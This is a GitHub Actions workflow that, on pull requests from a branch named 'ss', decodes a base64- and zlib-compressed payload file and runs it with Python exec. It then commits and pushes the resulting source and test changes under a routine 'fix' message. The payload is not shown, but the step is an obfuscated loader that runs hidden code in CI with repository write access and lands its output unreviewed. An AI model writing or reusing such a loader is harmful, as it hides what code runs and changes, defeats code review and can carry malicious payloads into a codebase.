name: Apply locked one-shot session v3

on:
  pull_request:
    branches: [main]
    paths:
      - .github/workflows/apply-one-shot-session-lock-v3.yml

permissions:
  contents: write

jobs:
  apply:
    if: github.event.pull_request.head.ref == 'ss' && github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ss
          fetch-depth: 0
          show-progress: false

      - uses: actions/setup-node@v4
        with:
          node-version-file: bot/.node-version
          cache: npm
          cache-dependency-path: bot/package-lock.json

      - name: Apply locked session integration
        shell: bash
        run: |
          python3 - <<'PY'
          from pathlib import Path
          import base64
          import zlib
          payload = Path('.github/scripts/one-shot-session-lock.payload').read_text().strip()
          script = zlib.decompress(base64.b64decode(payload)).decode()
          exec(compile(script, 'apply-one-shot-session-lock-v3', 'exec'))
          PY

      - name: Install and validate
        working-directory: bot
        run: |
          npm ci --ignore-scripts --no-fund --no-audit
          npm rebuild better-sqlite3 --foreground-scripts
          npm test
          npm run check

      - name: Commit source and integration tests
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add bot/src/discord-runner.js bot/test/runner-modes.node-test.js
          git commit -m "fix: lock one-shot quest manifest and completion attribution"
          git push origin HEAD:ss
